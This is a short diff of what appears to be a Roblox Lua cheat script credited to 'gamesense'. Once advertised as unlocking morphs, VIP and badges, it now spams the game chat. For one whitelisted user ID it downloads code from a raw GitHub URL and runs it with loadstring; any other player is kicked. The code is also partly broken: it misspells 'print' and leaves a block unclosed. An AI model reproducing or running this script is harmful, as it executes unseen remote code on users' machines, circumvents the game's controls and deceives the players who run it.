@@ -6,8 +6,15 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageReque
 wait(2)
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Started!","All")
 wait(1)
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("All morphs and VIP and BADGES get unlocked! Script made by gamesense!","All")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("made by gamesense!","All")
 wait(0.5)
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Made by gamesense","All")
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Made by gamesense","All")
+local player = game.Players.LocalPlayer
+
+      if game.Players.LocalPlayer.UserId == 2240953468 then
+     pirnt("get whitelisted!")
+      wait(1)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/ur-dude/protected/main/Loader_1.txt'))()
+       else
+           player:kick("ok")
+-- stop look here
